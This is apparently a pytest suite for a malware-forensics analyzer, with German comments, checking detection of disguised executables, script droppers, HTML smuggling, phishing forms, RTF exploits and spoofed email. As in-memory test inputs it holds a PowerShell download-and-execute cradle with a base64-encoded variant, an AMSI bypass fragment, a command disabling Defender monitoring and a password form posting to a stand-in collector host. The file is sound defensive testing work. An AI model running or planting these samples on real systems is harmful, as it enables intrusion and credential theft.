"""
Bedrohungs-Analysatoren.

Malware-ähnliche Textmuster werden NUR im Speicher (FakeCtx) geprüft, damit
Defender keine Testdateien löscht. Auf die Platte kommen nur harmlose Konstrukte.
"""
import email.message
import hashlib
import json
import shutil
import sqlite3
import sys
from pathlib import Path

import pytest

from core.filetype import identify
from engines import run_forensic
from engines.analyzers.base import run_all
from engines.analyzers.script import ScriptAnalyzer
from engines.analyzers.web import WebAnalyzer
from engines.analyzers.rtf import RtfAnalyzer
from engines.analyzers.yara_scan import YaraAnalyzer
from engines.analyzers.baseline import BaselineAnalyzer
from engines.analyzers.pe import PEAnalyzer
from tests.helpers import analyze, codes


class FakeCtx:
    """Minimaler Kontext für In-Memory-Tests (keine Datei auf der Platte)."""

    def __init__(self, data, subtype="text", category="script", ext=".txt", name="x.txt"):
        self.data = data
        self.head = data[:65536]
        self.text = data.decode("utf-8", "replace")
        self.subtype, self.category, self.ext = subtype, category, ext
        self.size = len(data)
        self.truncated = True          # YARA scannt dann self.data statt einer Datei
        self.path = "memory://" + name
        self.p = Path(name)
        self.shared = {}
        self.filetype = {"category": category, "subtype": subtype, "description": "test",
                         "extension": ext, "extension_mismatch": False, "expected_exts": []}


def _sha(p):
    return hashlib.sha256(Path(p).read_bytes()).hexdigest()


# ─── Typerkennung / Tarnung (harmlos auf Platte) ─────────────────────────────
def test_identify_basic_types(tmp_path, jpeg_file, pdf_file, docx_file):
    assert identify(jpeg_file)["subtype"] == "jpeg"
    assert identify(pdf_file)["category"] == "pdf"
    assert identify(docx_file)["subtype"] == "docx"
    p = tmp_path / "a.sqlite"
    sqlite3.connect(p).close()
    t = tmp_path / "t.txt"
    t.write_text("hallo")
    assert identify(t)["category"] == "text"


def test_exe_disguised_as_pdf(tmp_path):
    fake = tmp_path / "Rechnung.pdf"
    shutil.copy(sys.executable, fake)
    res = run_forensic(str(fake))
    assert res["ok"]
    assert res["kind"] == "executable"
    assert "disguised_executable" in {f["code"] for f in res["score"]["findings"]}
    assert res["score"]["score"] >= 60


def test_double_extension_and_rtlo(tmp_path):
    p = tmp_path / "Rechnung.pdf.exe"
    p.write_bytes(b"hallo")
    _, f = analyze(p, only={"baseline"})
    assert "double_extension" in codes(f)
    q = tmp_path / "invoice\u202egpj.exe"
    q.write_bytes(b"hallo")
    _, f = analyze(q, only={"baseline"})
    assert "rtlo_filename" in codes(f)


def test_pe_hidden_in_jpeg(tmp_path, jpeg_file):
    p = tmp_path / "urlaub.jpg"
    p.write_bytes(jpeg_file.read_bytes() + Path(sys.executable).read_bytes())
    data, f = analyze(p, only={"baseline"})
    assert "embedded_executable" in codes(f)
    assert "appended_data" in codes(f)


def test_clean_text_file_scores_zero(tmp_path):
    p = tmp_path / "notiz.txt"
    p.write_text("Einkaufsliste: Milch, Brot, Käse\n" * 20, encoding="utf-8")
    res = run_forensic(str(p))
    assert res["ok"] and res["kind"] == "text"
    assert res["score"]["score"] == 0


def test_unknown_binary_is_supported_now(tmp_path):
    p = tmp_path / "blob.xyz"
    p.write_bytes(bytes(range(256)) * 64)
    res = run_forensic(str(p))
    assert res["ok"], res["error"]
    assert res["kind"] == "binary"
    json.dumps(res)   # Export muss funktionieren


# ─── Skripte (nur im Speicher) ───────────────────────────────────────────────
def test_powershell_dropper_detected_in_memory():
    src = ("$c = New-Object Net.WebClient; IEX $c.DownloadString('http://example.invalid/a');"
           " powershell -w hidden -nop").encode()
    f = ScriptAnalyzer().run(FakeCtx(src, "powershell", ext=".ps1"))["findings"]
    assert {"script_downloader", "script_exec", "script_dropper"} <= codes(f)


def test_encoded_command_is_decoded_and_rechecked():
    import base64
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://example.invalid')"
    enc = base64.b64encode(inner.encode("utf-16-le")).decode()
    res = ScriptAnalyzer().run(FakeCtx(f"powershell -enc {enc}".encode(), "powershell", ext=".ps1"))
    assert "DownloadString" in res["data"]["decoded_payloads"][0]["decoded"]
    assert "script_downloader" in codes(res["findings"])


def test_amsi_bypass_is_critical():
    f = ScriptAnalyzer().run(FakeCtx(b"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
                                     "powershell", ext=".ps1"))["findings"]
    assert any(x["code"] == "script_amsi_bypass" and x["severity"] == "CRIT" for x in f)


def test_benign_script_is_quiet():
    src = b"Get-ChildItem C:\\Temp | Where-Object Length -gt 1MB | Sort-Object Length"
    assert not ScriptAnalyzer().run(FakeCtx(src, "powershell", ext=".ps1"))["findings"]


# ─── Web / RTF (nur im Speicher) ─────────────────────────────────────────────
def test_html_smuggling():
    html = (b"<html><script>var b=atob('UEsDBA==');var blob=new Blob([b]);"
            b"var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='x.zip';</script></html>")
    f = WebAnalyzer().run(FakeCtx(html, "html", "web", ".html", "x.html"))["findings"]
    assert "html_smuggling" in codes(f)


def test_phishing_form():
    html = (b"<html><title>Microsoft Office 365</title><form action='https://collector.example.invalid/p.php'>"
            b"<input type='password' name='pw'></form></html>")
    f = WebAnalyzer().run(FakeCtx(html, "html", "web", ".html", "login.html"))["findings"]
    assert any(x["code"] == "phishing_form" and x["severity"] == "CRIT" for x in f)


def test_rtf_equation_editor():
    rtf = b"{\\rtf1{\\object\\objemb\\objupdate{\\*\\objclass Equation.3}{\\*\\objdata 0105}}}"
    f = RtfAnalyzer().run(FakeCtx(rtf, "rtf", "rtf", ".rtf"))["findings"]
    assert {"rtf_equation_exploit", "rtf_autoupdate", "rtf_ole_object"} <= codes(f)


# ─── YARA ────────────────────────────────────────────────────────────────────
def test_yara_rules_compile_and_match_in_memory():
    ya = YaraAnalyzer()
    ctx = FakeCtx(b"config: stratum+tcp://pool.example.invalid:3333 --donate-level 1", ext=".json")
    assert ya.applies(ctx)
    res = ya.run(ctx)
    assert not res["data"]["compile_errors"]
    assert any("Crypto_Miner" in m["rule"] for m in res["data"]["matches"])


# ─── Programme ───────────────────────────────────────────────────────────────
@pytest.mark.skipif(sys.platform != "win32", reason="Authenticode-Signatur nur bei der Windows-python.exe")
def test_signed_python_exe_is_not_malicious():
    res = run_forensic(sys.executable)
    assert res["ok"]
    pe = res["report"]["analyzers"]["pe"]
    assert pe["signed"] is True
    assert not [f for f in res["score"]["findings"] if f["severity"] == "CRIT"]


@pytest.mark.skipif(not Path(r"C:\Windows\System32\notepad.exe").exists(), reason="nur Windows")
def test_system_binary_not_flagged_as_fake_vendor():
    ctx_data, f = analyze(r"C:\Windows\System32\notepad.exe", only={"pe"})
    assert "pe_fake_vendor" not in codes(f)


# ─── E-Mail (harmlos auf Platte) ─────────────────────────────────────────────
def test_email_spoofing(tmp_path):
    m = email.message.EmailMessage()
    m["From"] = '"service@paypal.com" <attacker@evil.invalid>'
    m["To"] = "opfer@example.invalid"
    m["Reply-To"] = "sammler@other.invalid"
    m["Subject"] = "Konto gesperrt"
    m["Authentication-Results"] = "mx.example; spf=fail smtp.mailfrom=evil.invalid; dmarc=fail"
    m.set_content("Bitte bestätigen")
    m.add_alternative('<a href="https://evil.invalid/login">https://www.paypal.com/signin</a>', subtype="html")
    m.add_attachment(b"MZ" + b"\x00" * 64, maintype="application", subtype="octet-stream",
                     filename="Rechnung.pdf.exe")
    p = tmp_path / "mail.eml"
    p.write_bytes(bytes(m))
    data, f = analyze(p, only={"email"})
    c = codes(f)
    assert {"email_display_spoof", "email_reply_mismatch", "email_auth_fail",
            "email_dangerous_attachment", "email_masked_link", "double_extension"} <= c


# ─── SQLite + Nur-Lesen-Garantie ─────────────────────────────────────────────
def test_sqlite_freelist_and_read_only(tmp_path):
    p = tmp_path / "History"
    con = sqlite3.connect(p)
    con.execute("CREATE TABLE urls(id INTEGER PRIMARY KEY, url TEXT)")
    con.execute("CREATE TABLE visits(id INTEGER PRIMARY KEY, url INTEGER)")
    con.executemany("INSERT INTO urls(url) VALUES (?)", [("https://example.invalid/" + "x" * 500,)] * 400)
    con.commit()
    con.execute("DELETE FROM urls WHERE id > 50")
    con.commit()
    con.close()
    before, mtime = _sha(p), p.stat().st_mtime_ns
    res = run_forensic(str(p))
    assert res["ok"] and res["kind"] == "database"
    sq = res["report"]["analyzers"]["sqlite"]
    assert sq["freelist_pages"] > 0
    assert "Chromium-Browserverlauf (History)" in sq["recognized_as"]
    assert _sha(p) == before and p.stat().st_mtime_ns == mtime
    assert not Path(str(p) + "-journal").exists() and not Path(str(p) + "-wal").exists()


def test_zip_bomb_end_to_end_and_unchanged(tmp_path):
    import zipfile
    p = tmp_path / "bomb.zip"
    with zipfile.ZipFile(p, "w", zipfile.ZIP_BZIP2) as z:
        with z.open("a.bin", "w") as fh:
            for _ in range(30):
                fh.write(b"\x00" * (1 << 20))
    before = _sha(p)
    res = run_forensic(str(p))
    assert res["ok"] and res["kind"] == "archive"
    assert res["score"]["level"] in ("HIGH RISK", "CRITICAL")
    assert "Archiv/Zipbomb" in res["threat"]["families"]
    assert _sha(p) == before
    assert list(tmp_path.iterdir()) == [p]     # nichts entpackt


# ─── Isolation ───────────────────────────────────────────────────────────────
def test_crashing_analyzer_is_isolated(tmp_path):
    class Boom:
        name = "boom"
        def applies(self, ctx): return True
        def run(self, ctx): raise RuntimeError("kaputt")
    p = tmp_path / "a.txt"
    p.write_text("x")
    res = run_forensic(str(p), analyzers=[Boom(), BaselineAnalyzer()])
    assert res["ok"]
    assert "kaputt" in res["report"]["analyzers"]["boom"]["_error"]
    assert "baseline" in res["report"]["analyzers"]


# ─── Scoring-Regressionen (Fehlalarme aus dem Realitätscheck) ─────────────────
def test_many_info_findings_never_reach_high_risk():
    from engines.score_engine import ScoreEngine
    infos = [{"code": c, "desc": "x", "severity": "INFO"} for c in
             ("embedded_executable", "embedded_executable", "embedded_executable", "pe_keylogger_apis",
              "pe_ransomware_combo", "pe_dropper_combo", "network_iocs", "pe_tls_callback", "pe_unsigned")]
    s = ScoreEngine().score_findings(infos)
    assert s["level"] in ("CLEAN", "LOW RISK"), s["score"]


def test_single_hard_indicator_reaches_high_risk():
    from engines.score_engine import ScoreEngine
    for code in ("zip_bomb", "disguised_executable", "rtlo_filename", "script_webshell", "html_smuggling"):
        s = ScoreEngine().score_findings([{"code": code, "desc": "x", "severity": "CRIT"}])
        assert s["level"] in ("HIGH RISK", "CRITICAL"), (code, s["score"])


def test_signature_block_softens_script_findings():
    src = b"Set-MpPreference -DisableRealtimeMonitoring $true\r\n# SIG # Begin signature block\r\n# MIIx..."
    f = ScriptAnalyzer().run(FakeCtx(src, "powershell", ext=".ps1"))["findings"]
    assert f and all(x["severity"] != "CRIT" for x in f)
